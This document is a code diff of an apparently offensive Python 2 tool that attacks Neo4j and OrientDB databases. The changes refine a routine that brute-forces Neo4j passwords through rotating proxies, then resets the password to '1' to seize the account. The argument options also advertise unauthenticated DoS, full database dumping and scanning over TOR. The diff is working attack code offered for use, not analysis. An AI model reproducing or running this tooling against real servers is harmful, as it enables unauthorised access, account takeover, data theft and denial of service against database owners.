@@ -41,14 +41,24 @@ def dos_disco1(ip,url_query,url_labels,url_props,headers):
 def brutteForce_Neo4j(ip,dictpassw,dictproxies,headers):
 	d = {}
 	url_changepassword = "http://"+ ip +":7474/user/neo4j/password"
-	data = '{"password":"1"}';
+	data = '{"password":"1"}'
+	print dictpassw
+	print dictproxies
 	for i,passw in enumerate(dictpassw):
 		proxies = {
-  			'http': 'http://'+dictproxies[i%len(dictproxies)],
+  			'http': 'http://'+dictproxies[i%(len(dictproxies)-1)],
 		}
-		r_pass = requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=0.1)
-		if (r_pass.status_code == 200):
-			return passw
+		print i%(len(dictproxies)-1)
+		print (dictproxies)
+		print proxies
+		try:
+			r_pass = requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=2, proxies=proxies )
+			print r_pass
+			if (r_pass.status_code == 200):
+				print "Password: " + passw
+				return passw
+		except Exception as e:
+			print e
 
 def brutteForce_Orient(ip,dictpassw):
 
@@ -67,7 +77,7 @@ def analyzeIP_Orient(ip,args):
 			json_response = r.json()
 			''' Para saber info del server es necesario romper la pass de root'''			
 			if args.bruteForce == True:
-				p,infoServer = brutteForce_Orient(ip,args.dict)
+				p,infoServer = brutteForce_Orient(ip,args.listPassw)
             			data_report['server_pass'] = p
 				data_report['server_info'] = infoServer.json()
 
@@ -175,9 +185,10 @@ def analyzeIP_Neo4j(ip,args):
 					data_report["version"] = "< 3.X"
 					data_report["ip"] = ip
 	        		if args.bruteForce == True:
-					passwd_old = brutteForce_Neo4j(ip,args.dict,args.proxies,headers)
+					passwd_old = brutteForce_Neo4j(ip,args.listPassw,args.listProxies,headers)
 					r = requests.get(url,auth=('neo4j', '1'),timeout=1)
 					if (r.status_code == 200):
+						print "New password: 1"
 						data_report["change_password"] = "yes"
 						data_report["old_passwd"]= passwd_old
 			    		else:
@@ -189,7 +200,7 @@ def analyzeIP_Neo4j(ip,args):
 			print "The ip: " + ip + " is not a Neo4j graph database."
 
 	except Exception as e:
-		print "Error" 
+		print e
 
 
 def getArguments(args):
@@ -207,8 +218,8 @@ def getArguments(args):
 	parser.add_argument("-o", dest='output', help="Output file", default="report.txt")
 
 	parser.add_argument('-B','--bruteforce', dest='bruteForce',action='store_true', help='Option to use brute force with authentication Neo4j.')
-    	parser.add_argument("-dict", dest='dict', help="Dictionary file, one password per line", default="dict.txt")
-	parser.add_argument("-proxies", dest='proxies', help="Proxies file, format: <ip>:<port>", default="proxies.txt")
+    	parser.add_argument("-dict", dest='dict', help="Dictionary file, one password per line", default="dict")
+	parser.add_argument("-proxies", dest='proxies', help="Proxies file, format: <ip>:<port>", default="proxies")
 	parser.add_argument('-nl', '--no-limit', dest='limit', action='store_true',help='Option to dump all database of Neo4j without auth.')
 	parser.add_argument('-tor', dest='tor', action='store_true',help='Option to use proxy TOR to scan de input data, need install and run before executed.')
 	parser.add_argument('-DoS', dest='DoS',action='store_true', help='Option to use DoS without authentication Neo4j.')
@@ -248,7 +259,8 @@ def getArguments(args):
 			try:
 			    f = open(args.dict, 'r')
 			    for line in f:
-				listPassw.append(line.strip())
+				listPassw.append(line.strip())	
+			    args.listPassw = listPassw			
 			except Exception as e:
 			    print "Wrong dict file.\n\n"
 			    print parser.print_help()
@@ -258,6 +270,7 @@ def getArguments(args):
 					f = open(args.proxies, 'r')
 			    		for line in f:
 						listProxies.append(line.strip())
+					args.listProxies = listProxies
 				except Exception as e:
 			    		print "Wrong proxies file.\n\n"
 			    		print parser.print_help()
@@ -281,7 +294,7 @@ def main():
 			data = analyzeIP_Orient(str(ip),args)
 			if (data is not None):
 				results.append(data)
-	fileout = open(args.output, "a")
+	fileout = open(args.output, "w")
 	json_str = json.dumps(results)
 	fileout.write(json_str)
 	fileout.close()
